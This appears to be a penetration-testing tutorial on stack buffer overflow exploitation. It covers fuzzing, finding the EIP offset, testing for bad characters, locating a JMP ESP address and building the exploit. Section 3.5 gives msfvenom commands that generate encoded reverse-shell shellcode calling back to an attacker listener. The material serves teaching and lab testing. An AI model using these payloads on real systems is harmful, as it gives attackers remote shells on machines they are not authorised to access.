# Table of contents
* [1 Identifying the buffer overflow vulnerability](#1-identifying-the-buffer-overflow-vulnerability)
* [2 Pre-requisites](#2-pre-requisites)
* [3 General Steps to follow](#3-general-steps-to-follow)
    * [3.1 Create the fuzzy payload](#31-create-the-fuzzy-payload)
    * [3.2 Get the exact number of bytes to reach at EIP](#32-get-the-exact-number-of-bytes)
    * [3.3 Identify the number of bytes to store shell code](#33-identify-the-number-of-bytes-to-store-shell-code)
    * [3.4 Identify the bad characters](#34-identify-the-bad-characters)
    * [3.5 Generate shell code](#35-generate-shell-code)
    * [3.6 Get the JMP ESP instruction address](#36-get-the-jmp-esp-instruction-address)
    * [3.7 Finalize the payload and exploit](#37-finalize-the-payload-and-exploit)

<hr>

# 1. Identifying the buffer overflow vulnerability
- Identification of buffer overflow vulnerability by only looking at the source code of the program or software is the skill of a good Penetration Tester. For example if you see that in case of C Programming Language *strcpy, strcmp* (and some other vulnerable functions) are being used without any proper validation then there are chances of buffer overflow.

- But it can also be done by using fuzzing techniques and analyzing the response or behaviour of the affected application/program/software i.e if program crashes by passing some large input that program was not expecting and it will not only fill its allocated space but also the surrounding memory areas, and you can see the error message like ``Program crashed unexpectedly`` or ``Access violation while accessing/reading/writing to hexadecimal memory address``.

# 2. Pre-requisites
- If you are writing your own buffer overflow vulnerable program then you will need to follow the pre-requisites to successfully test this vulnerability:
    - **Step # 1: Disable ASLR Protection**: For Linux the command will be: ```echo 0 | sudo tee /proc/sys/kernel/randomize_va_space```
    - **Step # 2: Compile the vulnerable code using gcc:** For Linux you will need to compile the program using gcc with the command ```gcc -g -o exploit vulnerable_program.c -fno-stack-protector -z execstack```
    - **Step # 3: Debug the compiled file using gdb(GNU Debugger)** ``gdb ./exploit -q``
- Some Common **gdb** flags
    - To Set the intel disassembly point in gdb ``set disassembly-flavor intel``
    - To pass the input using python to file ``run $(python -c 'print "A"*500'); ``
    - To set the breakpoints
        - ``b lineno``
        - ``b functionname``
        - ``b *address``
    - To view/analyze the memrory starting from Stack Pointer Register: ``x/200wb $esp`` (it will show you the 200 words starting from ESP)
    - To jump to next line of code: ``next or n``
    - To run the program until break point or exit: ``continue or c``

# 3. General steps to follow
- When you are confirmed that program is being crashed while passing large input values to its parameters and you are ready to test the exploitation of buffer overflow vulnerability then by following some common steps, you can successfully exploit this vulnerability. Those methods are as follows:
    
    ### 3.1 Create the fuzzy payload
    - We will use Kali Linux binary ``/usr/bin/msf-pattern_create`` for this step. Some common usage are as:
        - To create fuzzing payload of 1000 bytes: ``/usr/bin/msf-pattern_create -l 1000``
    ### 3.2 Get the exact number of bytes
    - In this step, you will need to pass the payload generated in above step to the program as input and identify the address where program crashed.
    - You can get that address value from the value of EIP register. For example you see ``76413176`` as the value of the EIP when program got crashed by passing the fuzzing payload.
    - Then pass that value ``76413176`` to the Kali Linux binary ``/usr/bin/msf-pattern_offset`` using command: ``/usr/bin/msf-pattern_offset -q 76413176`` and you will see the output as:

        ```
        [*] Exact match at offset 634
        ```
    - It means total 634 bytes are required to reach at the EIP register.

    ### 3.3 Identify the number of bytes to store shell code
    - Here you will need to pass the extra junk values to the program to identify the number of bytes that are available, so that we can reside our shell code. 
    - Normally, this can be done by passing random number of bytes (i.e 500) after overwriting the EIP. (Its practical will be shown in real-time examples explained below)

    ### 3.4 Identify the bad characters
    - There are about 256 possible characters that have special meanings of theirselves. But some of them are considered as bad by the program and we need to identify them using brute force approach.
    - We pass all 256 bad characters to our program and then analyze that which character is affecting the program badly and we add that character in our bad characters list that will be used in later steps.

    ### 3.5 Generate shell code
    - Shellcode is defined as a set of instructions injected and then executed by an exploited program. Shellcode is used to directly manipulate registers and the functionality of a exploited program.
    - We can generate the shell code using the Kali Linux with msfvenom tool. For example:
        - for Linux: ``msfvenom -a x86 --platform linux linux/x86/shell_reverse_tcp LHOST=192.168.56.1 LPORT=1010 -e x86/shikata_ga_nai -i 2 -b '\x00\x0a\x09\x20' -f c``
        - for windows: ``msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=1234 EXITFUNC=thread -f c -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -e x86/shikata_ga_nai -i 2``
    ### 3.6 Get the JMP ESP instruction address
    - Oftenly, the EIP register when is overwritten with an address where our shell code resides, EIP register values becomes inconsistent (is not as same as we overwritten with) or the memory location keeps changing.
    - So, the need was to identify a static memory address that will be written in EIP and the control of execution will go to our shell code so that we can execute our desired functionality. That's why, we find the ``JMP ESP`` instruction usage in any library or module that is being loaded with vulnerable program/application.
    - For this purpose, firstly, we get the assembly instructions of ``JMP ESP`` statement as follows:
        - ``/usr/bin/msf-nasm_shell``
        - ``> JMP ESP``
        - You will see the output as
            ```
            00000000  FFE4              jmp esp
            ```
            So the address is FFE4. Now we need to identify the library that is compiled with all security protections disabled like ASLR.

        - Then identify the address of the target library or module and check if there is null byte ``0x00`` in the starting of its address then ignore it and look for another library that is compiled with protections disabled and there is no null byte in its starting address.
        - In the case of Immunity Debugger, we can identify the usage of FFE4 with ``mona`` using ``!mona find -s "\xff\xe4" -m "target-library or module.dll"``
        - Now if any ``JMP ESP`` match founds then note down the address of that instruction and write it in little-endian format as we will use this address to be written on EIP.

    ### 3.7 Finalize the payload and exploit
    - Its time to finalize our exploit and we have to write a code in any language(i.e python) with correct values of junk,eip,nops,shell code and execute the exploit against the target. 

